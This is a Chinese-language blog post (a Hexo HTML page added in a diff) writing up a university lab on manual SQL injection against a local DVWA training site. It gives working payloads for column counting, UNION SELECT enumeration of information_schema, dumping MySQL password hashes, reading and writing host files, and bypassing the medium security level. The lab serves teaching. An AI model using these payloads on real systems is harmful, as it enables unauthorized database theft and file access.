@@ -1,0 +1,963 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Lobster:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext">
+  
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.0.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="所谓SQL注入，就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。">
+<meta name="keywords" content="Web-Test">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全实验——SQL注入攻击">
+<meta property="og:url" content="http://yoursite.com/2019/07/02/Web安全实验——SQL注入攻击/index.html">
+<meta property="og:site_name" content="Klaus&#39; Blog">
+<meta property="og:description" content="所谓SQL注入，就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/7df5bc6121e47ce1a8d2a74c6621cb10.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/2ac5789d2f78f9234049c8602f32b0ca.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/b8e1e0a7651fb1fcc4ea6c949a38dd52.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/d8174414cb8c5e32430453bd4a87f4e5.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/d3cfdfc7b4c751f1905ba5ddec0d14f2.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/7510bd3d5e709d78bb8c5bd4973f1e88.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/099bc40dd87e8ee67b4fc929680a8c77.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/45ebe0298ba40500436619d43164b4da.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/11c821c21028206402b08defe79c3470.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/7e18a0576cbf4cdaeda1a7419124a986.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/a5f791aa4c5e924354a297d00422a757.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/468c4358fb3766e703d49c7926260504.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/e841bb344d33470bdb9ba255ced6fe1c.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/55aefbbdb34ff4ee7aaeda775e8e20ed.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/6e36f2efe782bd6e218b6d10bafd87b1.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/16683688c7402a6780a43057b8b776fb.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/652cd73a18393267852e6a61ea74f31f.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/d06b5b394b59e5f4e5f9fc185b7fc476.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/f8f48b856b189eb85cf52e09343cb9d3.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/dffb2eb938b6bc561dd8bf5734a2e30f.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/981d69b761a7a8cf29b94ffedb4b7c48.png">
+<meta property="og:image" content="http://202.204.62.252/uploads/course_data/201805031732591/895b84d1eada2214b20c6f00ce07f475.png">
+<meta property="og:updated_time" content="2019-07-02T15:17:46.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Web安全实验——SQL注入攻击">
+<meta name="twitter:description" content="所谓SQL注入，就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。">
+<meta name="twitter:image" content="http://202.204.62.252/uploads/course_data/201805031732591/7df5bc6121e47ce1a8d2a74c6621cb10.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/07/02/Web安全实验——SQL注入攻击/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Web安全实验——SQL注入攻击 | Klaus' Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Klaus' Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/02/Web安全实验——SQL注入攻击/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Klaus">
+      <meta itemprop="description" content="Tough time don't last, tough people do.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Klaus' Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Web安全实验——SQL注入攻击
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-07-02 19:51:16 / Modified: 23:17:46" itemprop="dateCreated datePublished" datetime="2019-07-02T19:51:16+08:00">2019-07-02</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>所谓SQL注入，就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
+<a id="more"></a>
+<h2 id="SQL注入攻击实验（MySQL）"><a href="#SQL注入攻击实验（MySQL）" class="headerlink" title="SQL注入攻击实验（MySQL）"></a>SQL注入攻击实验（MySQL）</h2><h2 id="一-实验目的"><a href="#一-实验目的" class="headerlink" title="一. 实验目的"></a>一. 实验目的</h2><p>了解SQL语言、MySQL数据库相关的知识</p>
+<p>了解SQL注入的原理及相关知识</p>
+<p>能够手工进行简单的注入分析</p>
+<h2 id="二-实验原理"><a href="#二-实验原理" class="headerlink" title="二. 实验原理"></a>二. 实验原理</h2><p>所谓SQL注入，就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令，比如先前的很多影视网站泄露VIP会员密码大多就是通过WEB表单递交查询字符暴出的，这类表单特别容易受到SQL注入式攻击。</p>
+<h2 id="三-实验内容"><a href="#三-实验内容" class="headerlink" title="三. 实验内容"></a>三. 实验内容</h2><p>介绍SQL语言、MySQL数据库、SQL注入的相关知识 手动对注入点进行分析和攻击</p>
+<h2 id="四-实验环境描述"><a href="#四-实验环境描述" class="headerlink" title="四. 实验环境描述"></a>四. 实验环境描述</h2><p>1、学生机与实验室网络直连；</p>
+<p>2、VPC与实验室网络直连；</p>
+<p>3、学生机与VPC物理链路连通；</p>
+<p>pc机：Windows7旗舰版</p>
+<p>ip：172.16.1.155</p>
+<h2 id="五-实验步骤"><a href="#五-实验步骤" class="headerlink" title="五. 实验步骤"></a>五. 实验步骤</h2><p>注：实验中所有ip(如：172.17.135. <em>或 110.10.10.</em>)均要根据实际网络情况而改变，所用工具windows版的均在D:/tools中，linux版的均在 桌面上。</p>
+<p>一、 单击开始实验，进入实验环境。</p>
+<p>二、 win7默认用户名：admin，密码：123456</p>
+<p>三、实验配置：</p>
+<p>1、进入实验虚拟机，打开XMAPP(开始-所有程序-XAMPP-XAMPP Control Panel)，开启Apache HTTP服务和MYSQL服务，并点击这两个服务的actions下的Stop按钮为running状态，如下图所示：</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/7df5bc6121e47ce1a8d2a74c6621cb10.png" alt="图片描述"></p>
+<p>2、打开dvwa网站，<a href="http://127.0.0.1/dvwa/login.php%EF%BC%8C%E8%BF%9B%E5%85%A5%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2%EF%BC%8C%E7%99%BB%E9%99%86%E8%B4%A6%E5%8F%B7%EF%BC%9Aadmin" target="_blank" rel="noopener">http://127.0.0.1/dvwa/login.php，进入登陆界面，登陆账号：admin</a> 登陆密码：password。点击Create/Reset Database，创建数据模块。</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/2ac5789d2f78f9234049c8602f32b0ca.png" alt="图片描述"></p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/b8e1e0a7651fb1fcc4ea6c949a38dd52.png" alt="图片描述"></p>
+<p>四、步骤</p>
+<p>步骤1：打开存在漏洞的网站， <a href="http://127.0.0.1/dvwa/vulnerabilities/sqli/index.php" target="_blank" rel="noopener">http://127.0.0.1/dvwa/vulnerabilities/sqli/index.php</a></p>
+<p>进入如下界面：</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/d8174414cb8c5e32430453bd4a87f4e5.png" alt="图片描述"></p>
+<p>图 1存在SQL注入漏洞的页面</p>
+<p>步骤2：选择DVWA Security的安全级别，此处选择“low”。</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/d3cfdfc7b4c751f1905ba5ddec0d14f2.png" alt="图片描述"></p>
+<p>图2 DVWA Security安全级别</p>
+<p>步骤3：查看正常输出：在输入框里输入1，可以得到正常的返回结果。说明了该网页的功能是用来查找User ID等于指定值的用户的First name和Surname。</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/7510bd3d5e709d78bb8c5bd4973f1e88.png" alt="图片描述"></p>
+<p>图 3正常的返回结果</p>
+<p>步骤4：查看引号的种类：输入1’，可以发现未能返回正常结果。根据返回的错误结果说明目标网站使用的是MySQL数据库。根据此线索下面的攻击将采用MySQL相关的SQL语句。同时可以看出该判断语句使用单引号作为参数传递的边界。</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/099bc40dd87e8ee67b4fc929680a8c77.png" alt="图片描述"></p>
+<p>图 4错误页面</p>
+<p>步骤5：查看ａｎｄ判断语句：输入1’ ａｎｄ 1=1#，返回正常结果。（#在MySQL中代表将后面的字符注释掉）</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/45ebe0298ba40500436619d43164b4da.png" alt="图片描述"></p>
+<p>图 5正常的返回结果</p>
+<p>步骤6：判断数据表的长度：现在已经确认该网站存在SQL注入漏洞，现在根据此漏洞进行下一步的注入动作。输入a’ order by 1#，返回空页面，表明所查询数据表至少有一列。输入a’ order by 2#，返回空页面，表明所查询数据表至少有两列。输入a’ order by 3#，返回“Unknown colum’3’ in ‘oder clause’”，说明所查询的数据表中只有两列。</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/11c821c21028206402b08defe79c3470.png" alt="图片描述"></p>
+<p>图 7错误的返回页面</p>
+<p>步骤7：猜解数据表中列的名字，输入a’ ｏｒ firstname IS NULL;# 返回“Unknown column ＇firstname＇ in ＇where clause＇”。 可以判定数据表中列名并非firstname。 继续判断，输入a’ ｏｒ first_name IS NULL;#，什么都没有返回，说明存在列名叫做“first_name”的一列，并且数据表中没有此列为空的数据项。</p>
+<p>根据此原理，尝试猜解另外的字段，比如user_id、last_name、lastname、links、link、avatar、user、password、passwd等。</p>
+<p>步骤8：猜解数据表的名称：输入a’ ｏｒ test.user_id IS NOT NULL;#，返回错误页面。其中test.user_id采用的是表名.字段名的格式。test为猜解的数据表的名称。</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/7e18a0576cbf4cdaeda1a7419124a986.png" alt="图片描述"></p>
+<p>图 8判断数据表名的返回页面</p>
+<p>根据错误信息，可知数据表的名称并不是“test”，继续猜解，选用几个不同的猜解选项，使用users时，得到如下结果。</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/a5f791aa4c5e924354a297d00422a757.png" alt="图片描述"></p>
+<p>图 9猜解表名的返回结果</p>
+<p>步骤9：猜解更多表名：输入1’ ａｎｄ (ｓｅｌｅｃｔ count(*) from tablenames)&gt;0;#，其中tablenames为猜解的表名，加入不存在所猜解的表，则显示：Table ＇dvwa.tables＇ doesn＇t exist 如存在所猜解的表，则返回正确结果。通过此种方式，可以猜解所在数据库中的表名。</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/468c4358fb3766e703d49c7926260504.png" alt="图片描述"></p>
+<p>步骤10：猜解数据库名：输入a’ ｏｒ database() LIKE ‘％k％’;#，返回空白页面，即没有搜索到符合条件的结果，也就是说没有找到名称包含k的数据库。 依照同样的方法，测试如下输入：</p>
+<p>a’ ｏｒ database() LIKE ‘％A％’;# a’ ｏｒ database() LIKE ‘_’;# a’ ｏｒ database() LIKE ‘％w％’;# a’ ｏｒ database() LIKE ‘D％’;# a’ ｏｒ database() LIKE ‘％A’;# a’ ｏｒ database() LIKE ‘％z％’;# a’ ｏｒ database() LIKE ‘％k％’;# a’ ｏｒ database() LIKE ‘_v_a’;#</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/e841bb344d33470bdb9ba255ced6fe1c.png" alt="图片描述"></p>
+<p>步骤11：请输入以下代码， a’ ｕｎｉｏｎ ｓｅｌｅｃｔ table_schema, table_name from information_schema.tables where table_schema like ‘％dv％，返回如下结果。其中information_schema提供了访问数据库元数据的方式，元数据是关于数据的数据，如数据库名及表名，列的数据类型，或访问权限等。</p>
+<p>Table_schema和table_name字段分别是数据库名和表名。</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/55aefbbdb34ff4ee7aaeda775e8e20ed.png" alt="图片描述"></p>
+<p>图12数据库名和表名</p>
+<p>步骤12：请输入以下代码， a’ ｕｎｉｏｎ ｓｅｌｅｃｔ table_schema, table_name from information_schema.tables;#，根据网站的配置，不限制返回的结果数目，因此会得到所有的数据。</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/6e36f2efe782bd6e218b6d10bafd87b1.png" alt="图片描述"></p>
+<p>图 13查询information_schma的数据表</p>
+<p>步骤13：查询SQL版本：输入a’ ｕｎｉｏｎ all ｓｅｌｅｃｔ 1,@@version;#。@@version是MySQL中定义的变量，存储数据库的版本号。其他变量还包括system_user()、user()等。</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/16683688c7402a6780a43057b8b776fb.png" alt="图片描述"></p>
+<p>图 14查询数据库版本</p>
+<p>输入a’ ｕｎｉｏｎ all ｓｅｌｅｃｔ system_user(), user();#。</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/652cd73a18393267852e6a61ea74f31f.png" alt="图片描述"></p>
+<p>图 15查询用户</p>
+<p>步骤14：获取密码的Hash值：输入1’ ｕｎｉｏｎ all ｓｅｌｅｃｔ user,password from mysql.user;#，可以得到数据库的用户名和密码的Hash值。（密码前面的*符号是系统自动添加）。</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/d06b5b394b59e5f4e5f9fc185b7fc476.png" alt="图片描述"></p>
+<p>图 16获得数据库的用户名和密码</p>
+<p>步骤15：读取主机文件：输入’ ｕｎｉｏｎ all ｓｅｌｅｃｔ load_file(‘d:＼＼1.txt’),’1。加入D盘下有一个内容为“this is the content of d:1.txt. thanks ｆｏｒ reading”的文件，则会得到如下结果。</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/f8f48b856b189eb85cf52e09343cb9d3.png" alt="图片描述"></p>
+<p>图 17利用注入漏洞读取文本文件</p>
+<p>通过此种方式，攻击者可以去读取网站的敏感文件，例如网站中的配置文件等等。</p>
+<p>步骤16：写入主机文件：输入＇ ｕｎｉｏｎ ｓｅｌｅｃｔ ＇test＇,＇123＇ into outfile ＇c:testing.txt，可以将“test 123”写入c:testing.txt文件中。通过’ ｕｎｉｏｎ all ｓｅｌｅｃｔ load_file(‘c:＼＼testing.txt’),’1，查看新建的文件内容。（此写入方法只能新建文件，不能在原来基础上修改）</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/dffb2eb938b6bc561dd8bf5734a2e30f.png" alt="图片描述"></p>
+<p>图 18查看新建的文件内容</p>
+<p>步骤18：在右侧点击DVWA Security，调整ｓｃｒｉｐｔ Security，从“low”调整至“medium”。</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/981d69b761a7a8cf29b94ffedb4b7c48.png" alt="图片描述"></p>
+<p>图 19调整安全难度</p>
+<p>返回SQL Injection选项卡， （<a href="http://127.0.0.1/dvwa/vulnerabilities/sqli/index.php%EF%BC%89%EF%BC%8C%E7%BB%A7%E7%BB%AD%E6%89%A7%E8%A1%8C%E4%B8%8A%E8%BF%B0%E6%93%8D%E4%BD%9C%E3%80%82" target="_blank" rel="noopener">http://127.0.0.1/dvwa/vulnerabilities/sqli/index.php），继续执行上述操作。</a> 输入1’ ａｎｄ ‘1’=’1，发现未能返回正常结果。 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version ｆｏｒ the right syntax to use near ＇＇ ｏｒ ＇1＇=＇1＇ at line 1 可以发现，现在的输入框设置是添加了转义设置，这里输入1 ｏｒ 1=1避免使用这些字符，同样有注入效果。</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805031732591/895b84d1eada2214b20c6f00ce07f475.png" alt="图片描述"></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web-Test/" rel="tag"># Web-Test</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/02/Web安全实验——XSS跨站脚本攻击/" rel="next" title="Web安全实验——XSS跨站脚本攻击">
+                <i class="fa fa-chevron-left"></i> Web安全实验——XSS跨站脚本攻击
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/02/Web安全实验——CSRF/" rel="prev" title="Web安全实验——CSRF">
+                Web安全实验——CSRF <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Klaus</p>
+              <div class="site-description motion-element" itemprop="description">Tough time don't last, tough people do.</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">28</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">9</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/KlausMichael0" title="GitHub &rarr; https://github.com/KlausMichael0" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入攻击实验（MySQL）"><span class="nav-number">1.</span> <span class="nav-text">SQL注入攻击实验（MySQL）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一-实验目的"><span class="nav-number">2.</span> <span class="nav-text">一. 实验目的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二-实验原理"><span class="nav-number">3.</span> <span class="nav-text">二. 实验原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三-实验内容"><span class="nav-number">4.</span> <span class="nav-text">三. 实验内容</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四-实验环境描述"><span class="nav-number">5.</span> <span class="nav-text">四. 实验环境描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五-实验步骤"><span class="nav-number">6.</span> <span class="nav-text">五. 实验步骤</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Klaus</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.0.1</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+  
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.1"></script>
+
+  <script src="/js/src/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=7.0.1"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
+
+
+
+  
+
+
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
